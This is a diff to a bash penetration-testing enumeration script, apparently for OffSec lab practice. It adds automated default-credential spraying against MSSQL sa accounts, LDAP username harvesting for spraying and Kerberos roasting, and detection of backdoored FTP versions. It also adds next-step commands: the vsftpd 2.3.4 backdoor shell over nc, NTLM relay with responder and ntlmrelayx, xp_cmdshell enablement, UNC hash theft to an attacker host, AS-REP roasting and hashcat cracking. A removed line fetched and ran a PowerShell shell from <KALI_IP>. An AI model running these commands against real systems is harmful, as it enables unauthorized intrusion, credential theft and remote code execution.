@@ -1141,6 +1141,20 @@ enum_smb() {
             > "$outdir/netexec_shares.txt" 2>&1 || true
     fi
 
+    # --- SMB vuln + signing check (enumeration only — nmap scripts do not exploit) ---
+    info "  → nmap SMB vuln scripts (ms17-010, signing)"
+    timeout 180 nmap --script=smb-vuln-ms17-010,smb2-security-mode,smb-protocols \
+        -p 445 -oN "$outdir/nmap_smb_vuln.txt" "$ip" 2>&1 | tail -5 || true
+
+    if grep -qiE 'VULNERABLE.*MS17-010|State: VULNERABLE' "$outdir/nmap_smb_vuln.txt" 2>/dev/null; then
+        success "  ★ SMB VULNERABLE TO MS17-010 (EternalBlue) on $ip ★"
+        echo "SMB MS17-010 VULNERABLE on $ip" >> "$target_dir/loot/quick_wins.txt"
+    fi
+    if grep -qiE 'message signing.*disabled|message_signing.*disabled|Message signing enabled but not required' "$outdir/nmap_smb_vuln.txt" 2>/dev/null; then
+        success "  ★ SMB signing disabled on $ip — relay candidate ★"
+        echo "SMB SIGNING DISABLED on $ip — relay target" >> "$target_dir/loot/quick_wins.txt"
+    fi
+
     # --- Extract notable findings ---
     {
         echo "=== SMB Quick Findings for $ip ==="
@@ -1222,6 +1236,31 @@ enum_ftp() {
     info "  → nmap FTP scripts"
     timeout 120 nmap --script=ftp-anon,ftp-bounce,ftp-syst \
         -p "$port" -oN "$outdir/nmap_ftp_scripts.txt" "$ip" 2>&1 | tail -5 || true
+
+    # --- Flag known-vulnerable FTP banners ---
+    if [[ -f "$outdir/banner.txt" ]]; then
+        local ftp_banner
+        ftp_banner=$(grep -iE 'vsftpd|proftpd|Serv-U|FileZilla|pure-ftpd|wu-ftpd|^220' "$outdir/banner.txt" 2>/dev/null | head -1)
+        if [[ -n "$ftp_banner" ]]; then
+            echo "FTP banner: $ftp_banner" > "$outdir/version_info.txt"
+            if echo "$ftp_banner" | grep -qi 'vsftpd 2\.3\.4'; then
+                success "  ★ vsftpd 2.3.4 BACKDOOR (CVE-2011-2523) on $ip:$port ★"
+                echo "FTP vsftpd 2.3.4 backdoor on $ip:$port" >> "$target_dir/loot/quick_wins.txt"
+            fi
+            if echo "$ftp_banner" | grep -qiE 'ProFTPD 1\.3\.5[^0-9]'; then
+                success "  ★ ProFTPD 1.3.5 mod_copy RCE (CVE-2015-3306) on $ip:$port ★"
+                echo "FTP ProFTPD 1.3.5 mod_copy on $ip:$port" >> "$target_dir/loot/quick_wins.txt"
+            fi
+            if echo "$ftp_banner" | grep -qiE 'ProFTPD 1\.3\.3c'; then
+                success "  ★ ProFTPD 1.3.3c backdoor (OSVDB-69562) on $ip:$port ★"
+                echo "FTP ProFTPD 1.3.3c backdoor on $ip:$port" >> "$target_dir/loot/quick_wins.txt"
+            fi
+            if echo "$ftp_banner" | grep -qi 'Serv-U'; then
+                warn "  Serv-U FTP detected — check CVE-2021-35211"
+                echo "FTP Serv-U detected on $ip:$port — check CVE-2021-35211" >> "$target_dir/loot/quick_wins.txt"
+            fi
+        fi
+    fi
 
     success "FTP enumeration complete for $ip:$port"
     progress_log "$target_dir" "DONE" "ftp" ""
@@ -1454,6 +1493,60 @@ enum_mysql() {
 
     success "MySQL enumeration complete for $ip:$port"
     progress_log "$target_dir" "DONE" "mysql_${port}" ""
+}
+
+#--- MSSQL ENUMERATION --------------------------------------------------------
+enum_mssql() {
+    local ip="$1"
+    local port="$2"
+    local target_dir="$3"
+    local outdir="$target_dir/tcp/mssql"
+    mkdir -p "$outdir"
+
+    if is_phase_done "$target_dir" "mssql_${port}"; then
+        info "MSSQL enum already done for $ip:$port — skipping"
+        return 0
+    fi
+    progress_log "$target_dir" "START" "mssql_${port}" ""
+
+    info "MSSQL enumeration starting: $ip:$port"
+
+    # --- Nmap MSSQL scripts ---
+    info "  → nmap MSSQL scripts"
+    timeout 180 nmap --script=ms-sql-info,ms-sql-ntlm-info,ms-sql-empty-password \
+        -p "$port" -oN "$outdir/nmap_mssql_scripts.txt" "$ip" 2>&1 | tail -5 || true
+
+    if grep -qiE 'empty password|sa.*<empty>' "$outdir/nmap_mssql_scripts.txt" 2>/dev/null; then
+        success "  ★ MSSQL EMPTY PASSWORD (sa) on $ip:$port ★"
+        echo "MSSQL EMPTY PASSWORD (sa) on $ip:$port" >> "$target_dir/loot/quick_wins.txt"
+    fi
+
+    # --- Try default sa credentials (same pattern as enum_mysql / enum_postgres) ---
+    local mssql_cmd=""
+    if check_tool impacket-mssqlclient; then
+        mssql_cmd="impacket-mssqlclient"
+    elif check_tool mssqlclient.py; then
+        mssql_cmd="mssqlclient.py"
+    fi
+
+    if [[ -n "$mssql_cmd" ]]; then
+        local pass
+        for pass in '' sa password Password1 sql admin; do
+            info "  → trying sa:${pass:-<empty>}"
+            timeout 20 "$mssql_cmd" "sa:${pass}@${ip}" -port "$port" \
+                -q 'SELECT @@version;' \
+                > "$outdir/login_sa_${pass:-empty}.txt" 2>&1 < /dev/null || true
+            if grep -qiE 'Microsoft|SQL Server' "$outdir/login_sa_${pass:-empty}.txt" 2>/dev/null && \
+               ! grep -qiE 'Login failed|authentication failed|ERROR' "$outdir/login_sa_${pass:-empty}.txt" 2>/dev/null; then
+                success "  ★ MSSQL LOGIN: sa:${pass:-<empty>} on $ip:$port ★"
+                echo "MSSQL LOGIN: sa:${pass:-<empty>} on $ip:$port" >> "$target_dir/loot/quick_wins.txt"
+                break
+            fi
+        done
+    fi
+
+    success "MSSQL enumeration complete for $ip:$port"
+    progress_log "$target_dir" "DONE" "mssql_${port}" ""
 }
 
 #--- POSTGRESQL ENUMERATION ---------------------------------------------------
@@ -1728,6 +1821,19 @@ enum_ldap() {
                     echo "NEXT: ldapsearch -x -H ldap://${ip}:${port} -b '${base_dn}' '(objectClass=*)' | grep -iE 'sAMAccountName|mail|description|memberOf'"
                     echo "NEXT (if domain-joined): ./adr.sh -d <DOMAIN> -u '' -p '' -dc ${ip}"
                 } >> "$target_dir/loot/quick_wins.txt"
+
+                # Extract sAMAccountName values for downstream spraying / Kerberos roasting
+                mkdir -p "$target_dir/loot"
+                local ldap_users_file="$target_dir/loot/ldap_users.txt"
+                grep -oP '^sAMAccountName:\s*\K\S+' "$outdir/ldap_full_dump.txt" 2>/dev/null | \
+                    grep -vE '\$$|^(krbtgt|Guest)$' | sort -u > "$ldap_users_file" || true
+                if is_nonempty_file "$ldap_users_file"; then
+                    local ldap_ucount
+                    ldap_ucount=$(wc -l < "$ldap_users_file" 2>/dev/null); ldap_ucount=${ldap_ucount:-0}
+                    success "  ★ Extracted $ldap_ucount usernames → loot/ldap_users.txt"
+                    echo "LDAP extracted $ldap_ucount usernames → $ldap_users_file" \
+                        >> "$target_dir/loot/quick_wins.txt"
+                fi
             fi
         fi
     fi
@@ -1906,6 +2012,10 @@ triage_and_enumerate() {
         # MySQL
         elif [[ "$service" =~ mysql ]] || [[ "$port" == "3306" ]]; then
             launch_enum enum_mysql "$ip" "$port" "$target_dir"
+
+        # MSSQL
+        elif [[ "$service" =~ ms-sql|mssql ]] || [[ "$port" == "1433" ]]; then
+            launch_enum enum_mssql "$ip" "$port" "$target_dir"
 
         # PostgreSQL
         elif [[ "$service" =~ postgres ]] || [[ "$port" == "5432" ]]; then
@@ -2172,6 +2282,27 @@ generate_next_steps() {
             "nmap --script smb2-security-mode -p 445 $ip" \
             "netexec smb $ip -M zerologon" \
             "netexec smb $ip -M petitpotam"
+
+        if grep -qi 'SMB MS17-010 VULNERABLE' "$target_dir/loot/quick_wins.txt" 2>/dev/null; then
+            append_next_finding "$next_file" \
+                "MS17-010 EternalBlue confirmed" \
+                "$target_dir/tcp/smb/nmap_smb_vuln.txt or quick_wins flagged MS17-010" \
+                "cat $target_dir/tcp/smb/nmap_smb_vuln.txt" \
+                "# OffSec-allowed exploit (manual, not auto):" \
+                "# searchsploit ms17-010   # pick python PoC (e.g. 42315.py)" \
+                "# python3 /usr/share/exploitdb/exploits/windows/remote/42315.py $ip"
+        fi
+
+        if grep -qi 'SMB SIGNING DISABLED' "$target_dir/loot/quick_wins.txt" 2>/dev/null; then
+            append_next_finding "$next_file" \
+                "SMB signing disabled — relay candidate" \
+                "$target_dir/tcp/smb/nmap_smb_vuln.txt shows signing not required" \
+                "# Generate relay target list from all hosts:" \
+                "netexec smb <subnet> --gen-relay-list /tmp/relay_targets.txt" \
+                "# Start responder + ntlmrelayx on Kali:" \
+                "sudo responder -I tun0 -wrf" \
+                "impacket-ntlmrelayx -tf /tmp/relay_targets.txt -smb2support -socks"
+        fi
     fi
 
     local winrm_port
@@ -2254,7 +2385,43 @@ generate_next_steps() {
             "$target_dir/tcp/ftp/ANONYMOUS_ACCESS.txt exists" \
             "ftp $ip" \
             "wget -r --no-passive-ftp ftp://anonymous:anon@$ip/" \
-            "find $target_dir/tcp/ftp/mirror -maxdepth 5 -type f 2>/dev/null | sort"
+            "find $target_dir/tcp/ftp/mirror -maxdepth 5 -type f 2>/dev/null | sort" \
+            "# Grep mirror for secrets/keys/creds:" \
+            "grep -RniE 'pass|secret|key|token|cred|user' $target_dir/tcp/ftp/mirror 2>/dev/null | head -40" \
+            "find $target_dir/tcp/ftp/mirror -type f \\( -name 'id_rsa*' -o -name '*.kdbx' -o -name '*.ps1' -o -name '*.config' \\) 2>/dev/null"
+    fi
+
+    if grep -qi 'FTP vsftpd 2\.3\.4 backdoor' "$target_dir/loot/quick_wins.txt" 2>/dev/null; then
+        local ftp_vuln_port
+        ftp_vuln_port=$(first_detected_port "$target_dir" 'ftp|^21/tcp')
+        [[ -z "$ftp_vuln_port" ]] && ftp_vuln_port="21"
+        append_next_finding "$next_file" \
+            "vsftpd 2.3.4 backdoor confirmed" \
+            "$target_dir/tcp/ftp/version_info.txt and quick_wins flagged vsftpd 2.3.4" \
+            "cat $target_dir/tcp/ftp/version_info.txt" \
+            "# OffSec-allowed manual exploit (smiley face backdoor on port 6200):" \
+            "# 1) ftp $ip — login as 'user:)' (note the smiley)" \
+            "# 2) On failure, port 6200 opens a root shell:" \
+            "nc -nv $ip 6200" \
+            "searchsploit vsftpd 2.3.4"
+    fi
+
+    if grep -qi 'FTP ProFTPD 1\.3\.5 mod_copy' "$target_dir/loot/quick_wins.txt" 2>/dev/null; then
+        append_next_finding "$next_file" \
+            "ProFTPD 1.3.5 mod_copy RCE candidate" \
+            "$target_dir/tcp/ftp/version_info.txt flagged ProFTPD 1.3.5" \
+            "cat $target_dir/tcp/ftp/version_info.txt" \
+            "searchsploit proftpd 1.3.5" \
+            "# Manual SITE CPFR/CPTO abuse via telnet:" \
+            "# telnet $ip 21 → SITE CPFR /etc/passwd ; SITE CPTO /var/www/html/p.txt"
+    fi
+
+    if grep -qi 'FTP ProFTPD 1\.3\.3c backdoor' "$target_dir/loot/quick_wins.txt" 2>/dev/null; then
+        append_next_finding "$next_file" \
+            "ProFTPD 1.3.3c backdoor candidate" \
+            "$target_dir/tcp/ftp/version_info.txt flagged ProFTPD 1.3.3c" \
+            "searchsploit proftpd 1.3.3c" \
+            "# Known backdoor distributed in 1.3.3c source tarball (OSVDB-69562)"
     fi
 
     local pop3_port imap_port
@@ -2444,20 +2611,32 @@ generate_next_steps() {
     local mssql_port
     mssql_port=$(first_detected_port "$target_dir" 'ms-sql|mssql|^1433/tcp')
     if [[ -n "$mssql_port" ]]; then
-        append_next_finding "$next_file" \
-            "MSSQL detected" \
-            "nmap service line includes port ${mssql_port}" \
-            "netexec mssql $ip -u <USER> -p '<PASS>'" \
-            "impacket-mssqlclient '<DOMAIN>/<USER>:<PASS>@$ip' -windows-auth" \
-            "impacket-mssqlclient '<USER>:<PASS>@$ip' -port $mssql_port" \
-            "nmap --script ms-sql-info,ms-sql-empty-password -p $mssql_port $ip" \
-            "# After login — enable and use xp_cmdshell for RCE:" \
-            "# SQL> EXEC sp_configure 'show advanced options', 1; RECONFIGURE;" \
-            "# SQL> EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;" \
-            "# SQL> EXEC xp_cmdshell 'whoami';" \
-            "# SQL> EXEC xp_cmdshell 'powershell -c IEX(IWR http://<KALI_IP>/shell.ps1 -UseBasicParsing)'" \
-            "# Steal hashes via UNC path:" \
-            "# SQL> EXEC xp_dirtree '\\\\<KALI_IP>\\share'   # then catch with responder"
+        local mssql_creds=""
+        mssql_creds=$(grep -oP 'MSSQL LOGIN:\s*\K\S+' "$target_dir/loot/quick_wins.txt" 2>/dev/null | head -1)
+        if [[ -n "$mssql_creds" ]]; then
+            local mssql_user="${mssql_creds%%:*}"
+            local mssql_pass="${mssql_creds#*:}"
+            [[ "$mssql_pass" == "<empty>" || "$mssql_pass" == "$mssql_creds" ]] && mssql_pass=""
+            append_next_finding "$next_file" \
+                "MSSQL login succeeded" \
+                "$target_dir/loot/quick_wins.txt contains MSSQL LOGIN" \
+                "impacket-mssqlclient '${mssql_user}:${mssql_pass}@${ip}' -port $mssql_port" \
+                "impacket-mssqlclient '${mssql_user}:${mssql_pass}@${ip}' -port $mssql_port -q 'SELECT @@version; SELECT IS_SRVROLEMEMBER(''sysadmin'');'" \
+                "# Enable xp_cmdshell for RCE (sysadmin required):" \
+                "impacket-mssqlclient '${mssql_user}:${mssql_pass}@${ip}' -port $mssql_port -q \"EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;\"" \
+                "impacket-mssqlclient '${mssql_user}:${mssql_pass}@${ip}' -port $mssql_port -q \"EXEC xp_cmdshell 'whoami'\"" \
+                "# Steal NetNTLM hash via UNC path (then catch with responder):" \
+                "impacket-mssqlclient '${mssql_user}:${mssql_pass}@${ip}' -port $mssql_port -q \"EXEC xp_dirtree '\\\\\\\\<KALI_IP>\\\\share'\""
+        else
+            append_next_finding "$next_file" \
+                "MSSQL detected" \
+                "nmap service line includes port ${mssql_port}" \
+                "netexec mssql $ip -u <USER> -p '<PASS>'" \
+                "impacket-mssqlclient '<DOMAIN>/<USER>:<PASS>@$ip' -windows-auth" \
+                "impacket-mssqlclient '<USER>:<PASS>@$ip' -port $mssql_port" \
+                "./crackr.sh --hydra mssql --target $ip -U <users.txt> -P /usr/share/wordlists/rockyou.txt" \
+                "nmap --script ms-sql-info,ms-sql-empty-password -p $mssql_port $ip"
+        fi
     fi
 
     local rdp_port
@@ -2474,12 +2653,29 @@ generate_next_steps() {
     local kerberos_port
     kerberos_port=$(first_detected_port "$target_dir" 'kerberos|^88/tcp|^464/tcp')
     if [[ -n "$kerberos_port" ]]; then
-        append_next_finding "$next_file" \
-            "Kerberos detected" \
-            "nmap service line includes port ${kerberos_port}" \
-            "nmap --script krb5-enum-users --script-args krb5-enum-users.realm='<DOMAIN>' -p $kerberos_port $ip" \
-            "impacket-GetNPUsers '<DOMAIN>/' -dc-ip $ip -usersfile <users.txt> -no-pass" \
-            "impacket-GetUserSPNs '<DOMAIN>/<USER>:<PASS>' -dc-ip $ip -request"
+        local ldap_users_file="$target_dir/loot/ldap_users.txt"
+        if is_nonempty_file "$ldap_users_file"; then
+            append_next_finding "$next_file" \
+                "Kerberos + LDAP usernames available — AS-REP roast ready" \
+                "Kerberos on port ${kerberos_port} and $ldap_users_file is non-empty" \
+                "cat $ldap_users_file" \
+                "# Extract domain from LDAP baseDN (replace <DOMAIN>):" \
+                "grep -oP 'DC=\\K[^,]+' $target_dir/tcp/ldap/naming_contexts.txt | paste -sd. -" \
+                "# Validate users with kerbrute:" \
+                "kerbrute userenum --dc $ip -d <DOMAIN> $ldap_users_file" \
+                "# AS-REP roast accounts with UF_DONT_REQUIRE_PREAUTH:" \
+                "impacket-GetNPUsers '<DOMAIN>/' -dc-ip $ip -usersfile $ldap_users_file -no-pass -format hashcat -outputfile $target_dir/loot/asrep_hashes.txt" \
+                "# Crack AS-REP hashes offline (hashcat mode 18200):" \
+                "hashcat -m 18200 $target_dir/loot/asrep_hashes.txt /usr/share/wordlists/rockyou.txt"
+        else
+            append_next_finding "$next_file" \
+                "Kerberos detected" \
+                "nmap service line includes port ${kerberos_port}" \
+                "nmap --script krb5-enum-users --script-args krb5-enum-users.realm='<DOMAIN>' -p $kerberos_port $ip" \
+                "kerbrute userenum --dc $ip -d <DOMAIN> <users.txt>" \
+                "impacket-GetNPUsers '<DOMAIN>/' -dc-ip $ip -usersfile <users.txt> -no-pass -format hashcat" \
+                "impacket-GetUserSPNs '<DOMAIN>/<USER>:<PASS>' -dc-ip $ip -request"
+        fi
     fi
 
     if detected_tcp_port "$target_dir" "445" && [[ -n "$kerberos_port" || -n "$(first_detected_port "$target_dir" 'ldap|^389/tcp|^636/tcp|^3268/tcp')" ]]; then
